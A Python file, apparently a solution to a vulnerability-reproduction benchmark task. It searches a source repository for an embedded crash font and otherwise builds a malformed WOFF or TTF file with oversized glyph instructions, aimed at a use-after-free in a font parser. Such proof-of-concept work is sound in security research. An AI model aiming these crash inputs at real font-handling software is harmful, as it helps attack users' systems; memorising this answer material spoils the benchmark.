import os
import re
import tarfile
import struct
import gzip
import io
import zipfile
import zlib
from typing import Iterator, Optional, Tuple, List


class Solution:
    def solve(self, src_path: str) -> bytes:
        best = self._find_embedded_poc(src_path)
        if best is not None:
            return best

        supports_woff = self._repo_mentions_woff(src_path)
        if supports_woff:
            return self._build_woff_poc()

        # Fallback to raw TTF if WOFF not present in sources
        return self._build_ttf_poc()

    # -------------------- Repository scanning --------------------

    def _iter_repo_files(self, src_path: str, max_size: int = 2_000_000) -> Iterator[Tuple[str, bytes]]:
        if os.path.isdir(src_path):
            root = os.path.abspath(src_path)
            for dirpath, _, filenames in os.walk(root):
                for fn in filenames:
                    p = os.path.join(dirpath, fn)
                    try:
                        st = os.stat(p)
                    except OSError:
                        continue
                    if st.st_size <= 0 or st.st_size > max_size:
                        continue
                    rel = os.path.relpath(p, root).replace(os.sep, "/")
                    try:
                        with open(p, "rb") as f:
                            yield rel, f.read()
                    except OSError:
                        continue
            return

        if tarfile.is_tarfile(src_path):
            with tarfile.open(src_path, "r:*") as tf:
                for m in tf.getmembers():
                    if not m.isfile():
                        continue
                    if m.size <= 0 or m.size > max_size:
                        continue
                    try:
                        f = tf.extractfile(m)
                        if f is None:
                            continue
                        data = f.read()
                    except Exception:
                        continue
                    yield m.name, data
            return

        # Unknown input; treat as directory fallback
        if os.path.exists(src_path):
            try:
                with open(src_path, "rb") as f:
                    data = f.read(max_size + 1)
                if len(data) <= max_size:
                    yield os.path.basename(src_path), data
            except OSError:
                pass

    def _repo_mentions_woff(self, src_path: str) -> bool:
        patterns = (b"wOFF", b"WOFF", b"woff", b"WOFF2", b"wOF2")
        checked = 0
        for name, data in self._iter_repo_files(src_path, max_size=800_000):
            lname = name.lower()
            if not (lname.endswith((".cc", ".cpp", ".c", ".h", ".hpp", ".hh", ".inc", ".gn", ".gyp", ".py", ".md", ".txt"))):
                continue
            checked += 1
            if checked > 800:
                break
            if any(p in data for p in patterns):
                return True
        return False

    def _find_embedded_poc(self, src_path: str) -> Optional[bytes]:
        best_data = None
        best_rank = None

        keywords = [
            ("arvo", 600),
            ("919", 1200),
            ("use-after-free", 800),
            ("uaf", 600),
            ("heap", 200),
            ("asan", 300),
            ("msan", 200),
            ("ubsan", 200),
            ("oss-fuzz", 350),
            ("clusterfuzz", 350),
            ("fuzz", 250),
            ("crash", 400),
            ("repro", 450),
            ("poc", 450),
            ("regression", 250),
            ("testcase", 250),
            ("testdata", 150),
            ("corpus", 150),
        ]
        exts = {".ttf", ".otf", ".woff", ".woff2", ".ttc", ".dfont"}

        def rank_name(n: str) -> int:
            ln = n.lower()
            s = 0
            for k, w in keywords:
                if k in ln:
                    s += w
            _, e = os.path.splitext(ln)
            if e in exts:
                s += 120
            if "/test" in ln or "test/" in ln:
                s += 80
            return s

        def consider(name: str, data: bytes, extra_bonus: int = 0):
            nonlocal best_data, best_rank
            if not self._looks_like_font(data):
                return
            s = rank_name(name) + extra_bonus
            # Prefer shorter candidates among same score, but keep score dominant
            r = (s, -len(data))
            if best_rank is None or r > best_rank:
                best_rank = r
                best_data = data

        for name, data in self._iter_repo_files(src_path, max_size=1_500_000):
            consider(name, data, extra_bonus=0)

            # gzip-contained font
            if len(data) >= 2 and data[:2] == b"\x1f\x8b":
                try:
                    dec = gzip.decompress(data)
                    consider(name + "::gunzip", dec, extra_bonus=-40)
                except Exception:
                    pass

            # zip-contained font
            if len(data) >= 4 and data[:4] == b"PK\x03\x04":
                try:
                    zf = zipfile.ZipFile(io.BytesIO(data))
                    for zi in zf.infolist():
                        if zi.file_size <= 0 or zi.file_size > 2_000_000:
                            continue
                        try:
                            b = zf.read(zi)
                        except Exception:
                            continue
                        consider(name + "::zip::" + zi.filename, b, extra_bonus=-80)
                except Exception:
                    pass

        if best_data is not None:
            return best_data

        # Parse potential embedded byte arrays from source files if no binary font was found
        array_best = None
        array_best_rank = None
        for name, data in self._iter_repo_files(src_path, max_size=1_200_000):
            lname = name.lower()
            if not lname.endswith((".cc", ".cpp", ".c", ".h", ".hpp", ".hh", ".txt", ".md")):
                continue
            try:
                text = data.decode("utf-8", "ignore")
            except Exception:
                continue
            for arr_bytes in self._extract_byte_arrays_from_text(text):
                if self._looks_like_font(arr_bytes):
                    s = rank_name(name) + 50
                    r = (s, -len(arr_bytes))
                    if array_best_rank is None or r > array_best_rank:
                        array_best_rank = r
                        array_best = arr_bytes

        return array_best

    def _extract_byte_arrays_from_text(self, text: str) -> Iterator[bytes]:
        # Extract C-style { 0x.., 0x.. } blocks
        max_blocks = 80
        i = 0
        blocks = 0
        n = len(text)
        hex_re = re.compile(r"0x([0-9a-fA-F]{2})")
        while i < n and blocks < max_blocks:
            lb = text.find("{", i)
            if lb < 0:
                break
            rb = text.find("}", lb + 1)
            if rb < 0:
                break
            if rb - lb > 2_000_000:
                i = lb + 1
                continue
            block = text[lb:rb + 1]
            vals = hex_re.findall(block)
            if 80 <= len(vals) <= 500_000:
                try:
                    b = bytes(int(x, 16) for x in vals)
                    yield b
                    blocks += 1
                except Exception:
                    pass
            i = rb + 1

        # Extract "\xNN\xNN..." strings (best effort, limited)
        if "\\x" in text:
            try:
                # Find long runs of \x..
                run_re = re.compile(r"(?:\\x[0-9a-fA-F]{2}){80,}")
                for m in run_re.finditer(text):
                    s = m.group(0)
                    out = bytearray()
                    for j in range(0, len(s), 4):
                        out.append(int(s[j + 2:j + 4], 16))
                    yield bytes(out)
            except Exception:
                pass

    # -------------------- Font detection heuristics --------------------

    def _looks_like_font(self, b: bytes) -> bool:
        if not b or len(b) < 12:
            return False
        tag = b[:4]
        if tag in (b"wOFF", b"wOF2", b"ttcf", b"OTTO", b"true", b"typ1"):
            return True
        if tag == b"\x00\x01\x00\x00":
            if len(b) < 12:
                return False
            num_tables = struct.unpack(">H", b[4:6])[0]
            if not (1 <= num_tables <= 200):
                return False
            dir_end = 12 + 16 * num_tables
            if dir_end > len(b):
                return False
            return True
        # Heuristic: often sfnt starts with 0x00010000, wOFF, OTTO
        return False

    # -------------------- PoC generation (WOFF / TTF) --------------------

    def _u16(self, x: int) -> bytes:
        return struct.pack(">H", x & 0xFFFF)

    def _s16(self, x: int) -> bytes:
        return struct.pack(">h", int(x))

    def _u32(self, x: int) -> bytes:
        return struct.pack(">I", x & 0xFFFFFFFF)

    def _s32(self, x: int) -> bytes:
        return struct.pack(">i", int(x))

    def _align4(self, n: int) -> int:
        return (n + 3) & ~3

    def _checksum_u32_be(self, data: bytes) -> int:
        if len(data) % 4:
            data = data + b"\x00" * (4 - (len(data) % 4))
        s = 0
        for i in range(0, len(data), 4):
            s = (s + struct.unpack(">I", data[i:i + 4])[0]) & 0xFFFFFFFF
        return s

    def _build_tables(self, instr_len: int = 4096) -> List[Tuple[bytes, bytes]]:
        # Two glyphs: glyph 0 minimal, glyph 1 with long instructions.
        # glyf glyph data format: header(10) + instructionLength(2) + instructions.
        glyph0 = self._s16(0) + self._s16(0) + self._s16(0) + self._s16(0) + self._s16(0) + self._u16(0)
        glyph1 = self._s16(0) + self._s16(0) + self._s16(0) + self._s16(0) + self._s16(0) + self._u16(instr_len) + (b"\x00" * instr_len)
        # Ensure even length for loca short offsets; this is already even.
        if len(glyph0) % 2:
            glyph0 += b"\x00"
        if len(glyph1) % 2:
            glyph1 += b"\x00"
        glyf = glyph0 + glyph1
        glyf_len = len(glyf)

        # loca short: offsets/2, numGlyphs=2 => 3 entries
        off0 = 0
        off1 = len(glyph0)
        off2 = glyf_len
        if off1 % 2 or off2 % 2:
            # should not happen
            glyf += b"\x00" * ((2 - (len(glyf) % 2)) % 2)
            glyf_len = len(glyf)
            off2 = glyf_len
        loca = self._u16(off0 // 2) + self._u16(off1 // 2) + self._u16(off2 // 2)

        # head (54 bytes)
        # checkSumAdjustment set later
        head = (
            self._u32(0x00010000) +          # version
            self._u32(0x00010000) +          # fontRevision
            self._u32(0x00000000) +          # checkSumAdjustment (placeholder)
            self._u32(0x5F0F3CF5) +          # magicNumber
            self._u16(0x0003) +              # flags
            self._u16(1000) +                # unitsPerEm
            self._u32(0) + self._u32(0) +    # created
            self._u32(0) + self._u32(0) +    # modified
            self._s16(0) + self._s16(0) +    # xMin, yMin
            self._s16(0) + self._s16(0) +    # xMax, yMax
            self._u16(0) +                   # macStyle
            self._u16(8) +                   # lowestRecPPEM
            self._s16(2) +                   # fontDirectionHint
            self._s16(0) +                   # indexToLocFormat (0 short)
            self._s16(0)                     # glyphDataFormat
        )
        # hhea (36 bytes)
        ascent = 800
        descent = -200
        advance_width = 500
        hhea = (
            self._u32(0x00010000) +
            self._s16(ascent) + self._s16(descent) + self._s16(0) +
            self._u16(advance_width) +
            self._s16(0) + self._s16(0) + self._s16(0) +
            self._s16(1) + self._s16(0) + self._s16(0) +
            b"\x00" * 8 +
            self._s16(0) +
            self._u16(2)  # numberOfHMetrics
        )

        # maxp (32 bytes) version 1.0
        maxp = (
            self._u32(0x00010000) +
            self._u16(2) +              # numGlyphs
            self._u16(0) +              # maxPoints
            self._u16(0) +              # maxContours
            self._u16(0) +              # maxCompositePoints
            self._u16(0) +              # maxCompositeContours
            self._u16(1) +              # maxZones
            self._u16(0) +              # maxTwilightPoints
            self._u16(0) +              # maxStorage
            self._u16(0) +              # maxFunctionDefs
            self._u16(0) +              # maxInstructionDefs
            self._u16(0) +              # maxStackElements
            self._u16(instr_len & 0xFFFF) +  # maxSizeOfInstructions
            self._u16(0) +              # maxComponentElements
            self._u16(0)                # maxComponentDepth
        )

        # hmtx: 2 metrics
        hmtx = self._u16(advance_width) + self._s16(0) + self._u16(advance_width) + self._s16(0)

        # cmap: format 4, map U+0041 -> glyph 1
        # segment1: start=end=0x0041, idDelta = 1 - 0x0041 = -0x0040 = 0xFFC0
        # segment2 sentinel
        seg_count = 2
        seg_count_x2 = 2 * seg_count
        search_range = 2 * (2 ** (seg_count.bit_length() - 1))
        entry_selector = seg_count.bit_length() - 1
        range_shift = seg_count_x2 - search_range

        fmt4 = (
            self._u16(4) +
            self._u16(32) +
            self._u16(0) +
            self._u16(seg_count_x2) +
            self._u16(search_range) +
            self._u16(entry_selector) +
            self._u16(range_shift) +
            self._u16(0x0041) + self._u16(0xFFFF) +
            self._u16(0) +
            self._u16(0x0041) + self._u16(0xFFFF) +
            self._u16(0xFFC0) + self._u16(0x0001) +
            self._u16(0) + self._u16(0)
        )
        cmap = (
            self._u16(0) + self._u16(1) +
            self._u16(3) + self._u16(1) + self._u32(12) +
            fmt4
        )

        # name: 2 records (family=1, full=4), UTF-16BE
        s1 = "A".encode("utf-16-be")
        s2 = "A Regular".encode("utf-16-be")
        strings = s1 + s2
        count = 2
        string_offset = 6 + 12 * count
        name = (
            self._u16(0) + self._u16(count) + self._u16(string_offset) +
            # record 1
            self._u16(3) + self._u16(1) + self._u16(0x0409) + self._u16(1) + self._u16(len(s1)) + self._u16(0) +
            # record 2
            self._u16(3) + self._u16(1) + self._u16(0x0409) + self._u16(4) + self._u16(len(s2)) + self._u16(len(s1)) +
            strings
        )

        # post: version 3.0
        post = (
            self._u32(0x00030000) +
            self._s32(0) +
            self._s16(0) + self._s16(0) +
            self._u32(0) +
            self._u32(0) + self._u32(0) + self._u32(0) + self._u32(0)
        )

        # OS/2 v0 (78 bytes)
        os2 = (
            self._u16(0) +               # version
            self._s16(advance_width) +   # xAvgCharWidth
            self._u16(400) +             # usWeightClass
            self._u16(5) +               # usWidthClass
            self._u16(0) +               # fsType
            self._s16(0) + self._s16(0) + self._s16(0) + self._s16(0) +  # subscript sizes/offsets
            self._s16(0) + self._s16(0) + self._s16(0) + self._s16(0) +  # superscript sizes/offsets
            self._s16(0) + self._s16(0) +                                # strikeout size/position
            self._s16(0) +                                              # sFamilyClass
            b"\x00" * 10 +                                              # panose
            self._u32(0) + self._u32(0) + self._u32(0) + self._u32(0) +  # unicode ranges
            b"TEST" +                                                   # achVendID
            self._u16(0x0040) +                                         # fsSelection (REGULAR)
            self._u16(0x0041) + self._u16(0x0041) +                     # first/last char
            self._s16(ascent) + self._s16(descent) + self._s16(0) +      # typo
            self._u16(ascent) + self._u16(-descent)                     # win ascent/descent
        )
        if len(os2) != 78:
            os2 = os2[:78].ljust(78, b"\x00")

        return [
            (b"OS/2", os2),
            (b"cmap", cmap),
            (b"glyf", glyf),
            (b"head", head),
            (b"hhea", hhea),
            (b"hmtx", hmtx),
            (b"loca", loca),
            (b"maxp", maxp),
            (b"name", name),
            (b"post", post),
        ]

    def _build_ttf_from_tables(self, tables: List[Tuple[bytes, bytes]]) -> bytes:
        # Sort tables by tag (standard practice)
        tables = sorted(tables, key=lambda x: x[0])

        num_tables = len(tables)
        max_pow2 = 1
        while (max_pow2 << 1) <= num_tables:
            max_pow2 <<= 1
        search_range = max_pow2 * 16
        entry_selector = max_pow2.bit_length() - 1
        range_shift = num_tables * 16 - search_range

        # Prepare table records with offsets
        offset_table = (
            self._u32(0x00010000) +
            self._u16(num_tables) +
            self._u16(search_range) +
            self._u16(entry_selector) +
            self._u16(range_shift)
        )

        # Compute per-table checksums; head table checksum computed with checkSumAdjustment = 0
        checksums = {}
        for tag, data in tables:
            if tag == b"head" and len(data) >= 12:
                d = data[:8] + b"\x00\x00\x00\x00" + data[12:]
                checksums[tag] = self._checksum_u32_be(d)
            else:
                checksums[tag] = self._checksum_u32_be(data)

        dir_size = 16 * num_tables
        data_offset = 12 + dir_size
        # Build directory first with placeholder offsets
        records = []
        cursor = data_offset
        table_datas = []
        for tag, data in tables:
            off = cursor
            ln = len(data)
            records.append([tag, checksums[tag], off, ln])
            table_datas.append((tag, data))
            cursor += self._align4(ln)

        # Build font with head checksumAdjustment=0 first (for checkSumAdjustment computation)
        dir_bytes = bytearray()
        for tag, chk, off, ln in records:
            dir_bytes += tag + self._u32(chk) + self._u32(off) + self._u32(ln)

        font0 = bytearray()
        font0 += offset_table
        font0 += dir_bytes
        for tag, data in table_datas:
            font0 += data
            if len(data) % 4:
                font0 += b"\x00" * (4 - (len(data) % 4))

        # Set checkSumAdjustment so total checksum is 0xB1B0AFBA.
        # Compute with current value (which is 0 in head by construction).
        total_sum = self._checksum_u32_be(bytes(font0))
        adjustment = (0xB1B0AFBA - total_sum) & 0xFFFFFFFF

        # Patch head table checkSumAdjustment in the payload
        # Find head record and patch its data in font.
        head_off = None
        head_len = None
        for tag, _, off, ln in records:
            if tag == b"head":
                head_off, head_len = off, ln
                break

        if head_off is not None and head_len is not None and head_len >= 12:
            font0[head_off + 8:head_off + 12] = self._u32(adjustment)

        return bytes(font0)

    def _build_ttf_poc(self) -> bytes:
        tables = self._build_tables(instr_len=4096)
        return self._build_ttf_from_tables(tables)

    def _build_woff_poc(self) -> bytes:
        # Create a valid TTF first, then wrap it into WOFF with strong compression.
        tables = self._build_tables(instr_len=4096)
        ttf = self._build_ttf_from_tables(tables)

        # Prepare WOFF tables from the same raw table data as in sfnt (uncompressed),
        # but with head's checksum computed with checkSumAdjustment set to 0.
        table_map = {tag: data for tag, data in tables}
        table_tags = sorted(table_map.keys())

        # Compute WOFF origChecksum per table (sfnt checksum)
        orig_checksum = {}
        for tag in table_tags:
            data = table_map[tag]
            if tag == b"head" and len(data) >= 12:
                d = data[:8] + b"\x00\x00\x00\x00" + data[12:]
                orig_checksum[tag] = self._checksum_u32_be(d)
            else:
                orig_checksum[tag] = self._checksum_u32_be(data)

        # totalSfntSize from table directory computation
        num_tables = len(table_tags)
        total_sfnt = 12 + 16 * num_tables
        for tag in table_tags:
            total_sfnt += self._align4(len(table_map[tag]))

        # Compress each table
        entries = []
        data_blobs = []
        for tag in table_tags:
            raw = table_map[tag]
            comp = zlib.compress(raw, 9)
            if len(comp) < len(raw):
                blob = comp
                comp_len = len(comp)
            else:
                blob = raw
                comp_len = len(raw)
            entries.append([tag, 0, comp_len, len(raw), orig_checksum[tag]])
            data_blobs.append(blob)

        header_size = 44
        dir_size = 20 * num_tables
        cursor = header_size + dir_size
        cursor = self._align4(cursor)

        woff = bytearray(b"\x00" * header_size)
        # Fill directory with correct offsets
        for i, tag in enumerate(table_tags):
            blob = data_blobs[i]
            comp_len = entries[i][2]
            # align cursor to 4
            cursor = self._align4(cursor)
            entries[i][1] = cursor  # offset
            cursor += comp_len
            cursor = self._align4(cursor)

        total_len = cursor

        # Build header
        # signature, flavor, length, numTables, reserved, totalSfntSize, major, minor, metaOff, metaLen, metaOrigLen, privOff, privLen
        header = (
            b"wOFF" +
            self._u32(0x00010000) +
            self._u32(total_len) +
            self._u16(num_tables) +
            self._u16(0) +
            self._u32(total_sfnt) +
            self._u16(1) +
            self._u16(0) +
            self._u32(0) + self._u32(0) + self._u32(0) +
            self._u32(0) + self._u32(0)
        )
        woff[0:44] = header

        # Table directory
        dir_bytes = bytearray()
        for tag, off, comp_len, orig_len, chk in entries:
            dir_bytes += tag + self._u32(off) + self._u32(comp_len) + self._u32(orig_len) + self._u32(chk)
        woff += dir_bytes

        # Table data
        # Ensure woff length reaches first offset
        if len(woff) < header_size + dir_size:
            woff += b"\x00" * ((header_size + dir_size) - len(woff))
        woff = woff[:self._align4(len(woff))]

        for i, tag in enumerate(table_tags):
            off = entries[i][1]
            blob = data_blobs[i]
            if len(woff) < off:
                woff += b"\x00" * (off - len(woff))
            woff += blob
            woff = woff[:self._align4(len(woff))]

        # Patch length if alignment changed slightly
        total_len2 = len(woff)
        if total_len2 != total_len:
            woff[8:12] = self._u32(total_len2)

        return bytes(woff)